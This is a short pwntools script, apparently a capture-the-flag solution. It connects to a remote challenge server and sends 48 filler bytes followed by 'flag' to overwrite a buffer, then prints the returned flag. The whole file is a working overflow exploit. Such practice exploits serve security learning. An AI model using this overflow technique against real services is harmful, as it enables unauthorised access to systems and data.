from pwn import *

r = remote("thekidofarcrania.com", 35235)
r.sendlineafter(b'Input some text:', ('a'*48 + 'flag').encode())
for _ in range(15):
    r.recvline()

Flag = r.recvline().decode()[:-1]
print(Flag)
